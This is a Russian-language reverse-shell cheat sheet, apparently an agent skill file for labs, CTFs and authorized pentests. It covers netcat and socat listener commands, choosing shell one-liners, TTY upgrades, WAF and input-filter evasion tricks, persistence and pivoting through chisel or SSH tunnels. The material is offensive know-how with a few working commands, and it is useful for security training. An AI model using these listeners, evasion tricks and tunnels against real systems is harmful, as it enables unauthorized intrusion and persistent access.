# Revshell Arsenal — обратные шеллы (авторизованные цели)

## 0. Границы

Только лаборатории, CTF и явно авторизованные цели. Это закрепление доступа после найденной уязвимости, а не сама уязвимость.

## 1. Листенер

- В платформе с PTY-инструментами (например, `shell_open`) держи листенер в живой сессии: `nc -lvnp 9001` — видно вывод, можно вводить команды, сессия не умирает между шагами.
- Полноценный TTY сразу: `socat TCP-LISTEN:9001,reuseaddr,fork EXEC:'bash -li',pty,stderr,setsid,sigint,sane` (в PTY-сессии).
- Долгое ожидание подключения — фоновый мониторинг вывода листенера, а не цикл «запусти-проверь».

## 2. Выбор однострочника под цель

Не заучивай пейлоады наизусть — собирай под окружение цели:

1. Определи доступный интерпретатор/оболочку цели: bash? python3? php? powershell?
2. Возьми готовый шаблон с генераторов: **revshells.com** (все языки, опции кодирования/TLS), **pentestmonkey cheat sheet** (классика: php/perl/ruby/java), powercat для Windows.
3. Подставь IP/PORT листенера; закодируй при фильтрах (см. §4).
4. Windows-цель: паттерн powershell TCPClient (revshells → PowerShell reverse shell) или передать powercat и запустить с `-c IP -p PORT -e cmd`.
5. Нет исходящих TCP — пробуй UDP-варианты, ICMP/DNS-каналы (dnscat2), или туннель через разрешённый протокол (HTTP/HTTPS).

## 3. Апгрейд голого шелла до интерактивного

Схема (точные команды — в любом cheat sheet раздела «TTY upgrade»):

1. На цели запустить pty-обёртку (python3 `pty`-модуль — классический однострочник; нет python3 — `script -qc bash /dev/null`).
2. Суспенднуть сессию (Ctrl-Z), на листенере перевести терминал в raw-режим без эха и вернуть процесс на передний план.
3. В шелле цели выставить `TERM=xterm` и размер окна (rows/cols) — иначе ломаются vim/sudo и длинные строки.

Результат: полноценный терминал с автодополнением, корректным Ctrl-C и работающими интерактивными утилитами.

## 4. Обход фильтров ввода (web-канал)

- Пробелы → `${IFS}`; вырезание символов → конкатенация пустыми кавычками (`c""url`) или через переменные.
- Слэши/кавычки → base64-обёртка пейлоада.
- Лимит длины → записать длинную команду в файл по частям, затем выполнить.
- URL-кодировать всё при передаче в параметр; HTML-entity при XSS-канале.
- WAF на тело запроса → переключить метод/кодировку (`%xx`-вариации, unicode), вынести пейлоад в заголовок.

## 5. Порядок работы (не гадай)

1. До шелла проверь исходящий трафик цели: дёрнуть листенер из цели (curl/wget к своему IP:PORT). Нет — пробуй порты 443/53/80, UDP, DNS-каналы.
2. Листенер поднят заранее → триггеришь уязвимость → подключение.
3. Апгрейд до PTY (§3) → закрепление (setsid/nohup-фон) → разведка: см. скилл `linux-privesc`.
4. Обрывы — норма: ретрай-цикл на цели, листенер с `fork`.

## 6. Пивот и туннели (кратко)

- Проброс порта через compromised-хост: socat-форвард на цели.
- Туннель целиком: chisel / SSH `-R`/`-L`; в туннеле работают и листенер, и SOCKS-прокси для инструментов.
